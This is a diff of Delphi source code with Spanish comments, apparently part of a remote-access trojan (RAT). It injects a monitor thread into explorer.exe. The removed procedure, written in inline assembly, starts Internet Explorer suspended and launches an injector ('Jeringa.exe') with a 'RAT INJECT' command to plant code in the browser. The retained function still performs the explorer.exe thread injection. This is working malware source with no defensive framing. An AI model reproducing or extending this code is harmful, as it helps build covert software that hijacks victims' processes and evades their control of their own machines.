@@ -6,9 +6,8 @@ uses
   Windows,
   afxCodeHook;
 
-function InyectarMonitor(HExplorador: THandle; Navegador: string; instalado: Boolean): Boolean;
+function InyectarMonitor(HExplorador: THandle; Navegador: string): Boolean;
 procedure MonitorThreadYaInstalado(lpParameter: Pointer); stdcall;
-procedure MonitorThreadNoInstalado(lpParameter: Pointer); stdcall;
 type
   TInjectInfo = record
     pBeep: Pointer;
@@ -29,7 +28,7 @@ var
 
 implementation
 
-function InyectarMonitor(HExplorador: THandle; Navegador: string; instalado: Boolean): Boolean;
+function InyectarMonitor(HExplorador: THandle; Navegador: string): Boolean;
 begin
   Result := False;
 
@@ -48,10 +47,8 @@ begin
   InjectInfo.lpCallBack := InjectString(HExplorador, PChar(ParamStr(0)));
 
   //inyectamos la funcion MonitorThread y la ejecutamos en explorer.exe
-  if Instalado then
-    Thread := InjectThread(HExplorador, @MonitorThreadYaInstalado, @InjectInfo, SizeOf(TInjectInfo), False) //Inyectamos el thread
-  else
-    Thread := InjectThread(HExplorador, @MonitorThreadNOInstalado, @InjectInfo, SizeOf(TInjectInfo), False); //Inyectamos el thread
+
+    Thread := InjectThread(HExplorador, @MonitorThreadYaInstalado, @InjectInfo, SizeOf(TInjectInfo), False); //Inyectamos el thread
 
   if Thread = 0 then //FAIL!
     Exit
@@ -113,55 +110,6 @@ begin
 
                           //aquí tendriamos que idear algo para la desinstalación, de momento se encuentra inactiva
              JMP   @noret
-  end;
-end;
-
-procedure MonitorThreadNoInstalado(lpParameter: Pointer); stdcall; //Este es el código del antigüo monitor.dll, se ejecuta dentro de explorer.exe cuando el servidor NO está instaldo
-var
-  InjectInfo: TInjectInfo;
-  ProcInfo: TProcessInformation;
-  ProcInfo2: TProcessInformation;
-  P: Pointer;
-  P2: Pointer;
-begin
-  InjectInfo := TInjectInfo(lpParameter^);
-  ProcInfo := TProcessInformation(InjectInfo.lpProcInfo^);
-  P := @ProcInfo;
-  ProcInfo2 := TProcessInformation(InjectInfo.lpProcInfo2^);
-  P2 := @ProcInfo2;
-  asm
-             //CreateProcess();
-             PUSH  P
-             PUSH  InjectInfo.lpStartupInfo
-             PUSH  0
-             PUSH  0
-             PUSH  4      //   SUSPENDED
-             PUSH  0
-             PUSH  0
-             PUSH  0
-             PUSH  0
-             PUSH  InjectInfo.lpPathBrowser
-             CALL  InjectInfo.pCreateProcess   //Abrimos iexplore.exe en modo suspendido
-             //sleep(1000);
-             PUSH  1000          //Esperamos un poco antes de mandar la orden
-             CALL  InjectInfo.pSleep
-             //CreateProcess(Jeringa.exe, 'RAT INJECT');
-             PUSH  P2
-             PUSH  InjectInfo.lpStartupInfo
-             PUSH  0
-             PUSH  0
-             PUSH  0
-             PUSH  0
-             PUSH  0
-             PUSH  0
-             PUSH  InjectInfo.lpCommandLine
-             PUSH  InjectInfo.lpCallBack
-             CALL  InjectInfo.pCreateProcess   //Abrimos Jeringa.exe para que injecte el código a iexplore.exe
-             //WaitForSingleObject(INFINITO, ProcInfo.hprocess);
-             PUSH  $FFFFFFFF
-             PUSH  DWORD PTR DS:[&ProcInfo.hprocess]
-             CALL  InjectInfo.pWaitForSingleObject   //Esperamos a que termine el proceso
-             //sleep(17000);
   end;
 end;
 
